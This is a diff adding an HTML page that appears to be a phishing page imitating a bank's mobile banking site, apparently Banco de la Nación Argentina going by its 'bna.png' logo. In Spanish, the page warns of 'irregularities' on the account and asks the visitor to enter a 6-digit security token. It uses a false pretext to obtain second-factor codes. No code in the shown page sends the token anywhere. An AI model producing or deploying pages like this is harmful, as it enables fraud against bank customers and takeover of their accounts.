@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- Header superior -->
+    <header class="top-bar">
+        <div class="title">Mobile Banking</div>
+        <div class="classic">
+            <span class="home-icon">🏠</span>
+            Versión Clásica
+        </div>
+    </header>
+
+    <!-- Logo -->
+    <div class="logo-container">
+        <img src="bna.png" alt="Logo">
+    </div>
+
+    <!-- Card token -->
+    <div class="login-card">
+        <div class="login-title">Ingresá tu token</div>
+
+        <!-- Mensaje de error -->
+        <div class="token-error">
+            Notamos irregularidades en su cuenta, para continuar,
+            por favor digite su código <strong>Token de 6 dígitos</strong>
+        </div>
+
+        <input
+            type="text"
+            class="token-input"
+            maxlength="6"
+            inputmode="numeric"
+            placeholder=""
+        >
+
+        <button type="button" class="btn-accept">
+            <span class="check">✔</span>
+            Aceptar
+        </button>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <span class="close">✖</span>
+        <p>Salir</p>
+    </footer>
+
+    <!-- Script -->
+    <script>
+        const tokenInput = document.querySelector('.token-input');
+
+        tokenInput.addEventListener('input', () => {
+            tokenInput.value = tokenInput.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+
+</body>
+</html>
